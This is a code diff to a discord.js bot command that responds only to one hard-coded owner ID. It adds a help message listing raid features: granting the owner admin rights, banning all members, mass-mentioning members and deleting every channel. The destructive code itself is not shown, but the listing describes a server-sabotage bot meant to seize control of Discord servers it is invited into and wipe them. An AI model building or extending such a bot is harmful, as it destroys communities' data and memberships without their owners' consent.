@@ -2,6 +2,12 @@ const Discord = require("discord.js");
 
 exports.run = async (client, message, args) => {
   if (message.author.id !== "583649910092595232") return;
+  
+  var embed = new Discord.MessageEmbed()
+  .setDescription("**Leave**\n\`\`\`To make bot exit the server\`\`\`\n**Admin**\n\`\`\`Give admin permession\`\`\`\n**bl**\n\`\`\`Ban all members\`\`\`\n**mention**\n\`\`\`For mention members\`\`\`\n**raid**\`\`\`Deleting all channels\`\`\`")
+  .setColor("#00bfff")
+  .setFooter(client.user.username, client.user.displayAvatarURL())
+  message.channel.send(embed)
 
   if (args[0] === "leave") {
     try {
